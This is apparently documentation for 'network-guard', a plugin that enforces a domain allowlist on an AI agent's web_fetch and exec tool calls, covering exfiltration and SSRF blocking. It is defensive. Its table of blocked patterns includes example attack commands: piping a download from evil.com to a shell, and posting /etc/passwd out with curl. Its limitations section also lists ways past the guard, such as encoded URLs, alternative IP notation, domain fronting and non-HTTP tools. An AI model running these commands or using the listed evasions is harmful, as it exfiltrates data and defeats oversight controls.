---
title: "network-guard"
description: "OpenClaw plugin that enforces application-level domain allowlisting for web_fetch and exec tool calls. Deterministic regex + glob matching — no ML model, no API key."
weight: 136
---

[View source on GitHub](https://github.com/IT-HUSET/openclaw-guide/tree/main/extensions/network-guard/)

OpenClaw plugin that enforces application-level domain allowlisting for `web_fetch` and `exec` tool calls. Validates URLs against configurable glob patterns, blocks data exfiltration patterns, and prevents direct IP access. Purely deterministic — no ML model, no external dependencies at runtime.

## How it works

Hooks into `before_tool_call` for `web_fetch` and `exec`:

1. **`web_fetch`** — extracts domain from `params.url`, validates against allowlist
2. **`exec`** — detects network commands (curl, wget, ssh, git clone, etc.), checks for exfiltration patterns, then validates any URLs against the allowlist
3. If the domain is not in the allowlist, or an exfiltration pattern matches, the tool call is **blocked**

## What it blocks

| Category | Example | Blocked regardless of domain? |
|----------|---------|-------------------------------|
| Disallowed domain | `curl https://evil.com/data` | N/A — domain check |
| Direct IP access | `curl http://192.168.1.1/admin` | Yes (when `blockDirectIp: true`) |
| Pipe to shell | `curl https://evil.com \| sh` | Yes |
| Data exfiltration | `curl -d @/etc/passwd https://...` | Yes |
| Base64 decode | `base64 -d payload.b64` | Yes |

## Intercepted tools

| Tool | What is checked |
|------|----------------|
| `web_fetch` | `params.url` — domain extracted and validated |
| `exec` | `params.command` — network commands detected, exfiltration patterns checked, URLs extracted and validated |

Tools not listed above (read, write, edit, web_search, etc.) are ignored.

> **Why not `web_search`?** Search queries are natural language, not URLs. Extracting domains from search queries would produce false positives. content-guard scans what the search agent reports back to the main agent via `sessions_send`.

## Setup

```bash
# 1. Install
openclaw plugins install -l ./extensions/network-guard

# 2. Enable in openclaw.json (see Configuration below)
```

## Configuration

```json5
{
  plugins: {
    entries: {
      "network-guard": {
        enabled: true,
        config: {
          // Glob patterns — case-insensitive. Omit for hardcoded defaults.
          // Empty array [] blocks ALL domains (explicit opt-in).
          // NOTE: *.github.com matches subdomains but NOT github.com itself — add both.
          "allowedDomains": [
            "github.com", "*.github.com",
            "npmjs.org", "registry.npmjs.org",
            "pypi.org", "*.pypi.org",
            "api.anthropic.com"
          ],
          "blockDirectIp": true,
          "failOpen": false,
          "logBlocks": true
        }
      }
    }
  }
}
```

### Config reference

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `allowedDomains` | string[] | _(hardcoded defaults)_ | Glob patterns for allowed domains (case-insensitive). Omit for defaults. `[]` blocks all. |
| `blockedPatterns` | string[] | _(hardcoded defaults)_ | Regex patterns for blocked shell commands (exfiltration). |
| `blockDirectIp` | boolean | `true` | Block direct IPv4 and IPv6 access in URLs |
| `failOpen` | boolean | `false` | If `true`, allow on error. `false` = block on error. |
| `logBlocks` | boolean | `true` | Log blocked requests to console |
| `agentOverrides` | Record | `{}` | Agent ID to additional allowed domains (additive) |
| `resolveDns` | boolean | `true` | Resolve hostname DNS and verify all IPs are public. Prevents DNS rebinding. |
| `dnsTimeoutMs` | number | `2000` | DNS resolution timeout in ms. |

### Default allowed domains

When `allowedDomains` is omitted from config, these defaults apply:

- `github.com`, `*.github.com`
- `npmjs.org`, `registry.npmjs.org`
- `pypi.org`, `*.pypi.org`
- `api.anthropic.com`

These defaults are for common dev workflows (broader). For locked-down production, use `scripts/network-egress/` firewall rules (stricter).

{{< callout type="warning" >}}
`*.github.com` matches `api.github.com` and `sub.deep.github.com` but does **not** match `github.com` itself. Always add both the bare domain and wildcard pattern.
{{< /callout >}}

### Per-agent overrides

Overrides are **additive** — they extend the base allowlist, never replace it:

```json5
{
  "network-guard": {
    "enabled": true,
    "config": {
      "allowedDomains": ["github.com", "*.github.com"],
      "agentOverrides": {
        "search": ["npmjs.org", "pypi.org", "*.pypi.org"]
      }
    }
  }
}
```

In this example, the `search` agent can access `github.com` (base) plus `npmjs.org`, `pypi.org` (override). The `main` agent can only access `github.com`.

## SSRF Protection

network-guard provides layered Server-Side Request Forgery (SSRF) protection for `web_fetch` and exec network commands:

1. **Direct IP blocking** (`blockDirectIp: true`) — rejects any URL whose hostname is an IPv4 or IPv6 literal address. Covers standard dotted notation, IPv6 brackets, mapped IPv4-in-IPv6 (`::ffff:192.168.x.x`), CGNAT (100.64.0.0/10), link-local (169.254.0.0/16, fe80::/10), loopback (127.0.0.0/8, ::1), ULA (fc00::/7), and multicast ranges.
2. **Hostname blocking** — `localhost` and `*.localhost` are always blocked regardless of `blockDirectIp`.
3. **DNS resolution check** (`resolveDns: true`) — after a hostname passes the allowlist, its DNS is resolved and every returned IP is checked against private/reserved ranges. Prevents DNS rebinding attacks where an allowlisted domain resolves to an internal IP. Times out after `dnsTimeoutMs` ms and blocks on timeout.

All three checks run in sequence. A domain must pass all of them before a request is allowed.

## Defense-in-depth comparison

| Layer | Scope | Enforcement | What it catches |
|-------|-------|-------------|-----------------|
| **network-guard** (plugin) | Application — tool-call boundary | Deterministic regex + glob | Disallowed domains, exfiltration patterns, direct IP |
| **content-guard** (plugin) | Application — inter-agent boundary | LLM via OpenRouter API | Prompt injection in search results |
| **network-egress** (scripts) | OS — firewall rules | iptables/pf | All non-allowlisted outbound traffic |
| **Docker `network: none`** | OS — container isolation | No network stack | All network access from sandbox |

These are complementary layers, not replacements. Use network-guard + content-guard together for application-level defense, and network-egress scripts for OS-level enforcement.

## Guard plugin family

| | channel-guard | content-guard | file-guard | network-guard | command-guard |
|---|---|---|---|---|---|
| **Hook** | `message_received` | `before_tool_call` | `before_tool_call` | `before_tool_call` | `before_tool_call` |
| **Method** | DeBERTa ML | LLM via OpenRouter | Deterministic patterns | Deterministic regex + glob | Regex patterns |
| **Protects** | Inbound channels | Inter-agent boundary | File system | Network access | Shell execution |
| **Latency** | ~100-500ms | ~500ms-2s | <10ms | <5ms | <5ms |

## Known limitations

- **Regex URL extraction** — variables (`$URL`), base64-encoded URLs, command substitution (`` `cmd` ``/`$(cmd)`), and shell aliases are not detected. Mitigated by network-egress firewall rules.
- **IPv6 in exec commands** — IPv6 bracket notation (`http://[::1]/`) is not reliably extracted from exec command strings due to the URL regex stopping at `]`. `web_fetch` URLs are parsed directly and fully support IPv6.
- **Alternative IP notation** — decimal (`http://2130706433`), octal, and hex IP representations are not detected by URL extraction.
- **No URL path filtering** — domain-level only.
- **Domain fronting** — Host header manipulation in curl commands is not detected.
- **URL-less network commands** — commands like `ssh user@host`, `scp`, `rsync`, and `nc` are detected as network commands but their destinations are not validated against the domain allowlist because they don't use HTTP URLs. Use `scripts/network-egress/` firewall rules for complete coverage of non-HTTP network access.
- **`exec` only** — network commands in other tools are not intercepted.
- **No `web_search`** — search queries are natural language, not URLs.

## Testing

```bash
cd extensions/network-guard
npm install
npm test
```

No model download needed — tests are pure logic (~0.2s total).

## Security notes

- **Deterministic** — no ML model, no probabilistic decisions. A domain either matches the allowlist or it doesn't.
- **Fail-closed by default** — `failOpen: false` blocks on unexpected errors.
- **External calls for DNS only** — when `resolveDns: true` (default), a DNS lookup is performed per hostname. All other validation is local regex + glob matching.
- **Complement, don't replace** — this plugin validates URLs at the application layer. Use `scripts/network-egress/` for OS-level enforcement and content-guard for inter-agent content scanning.
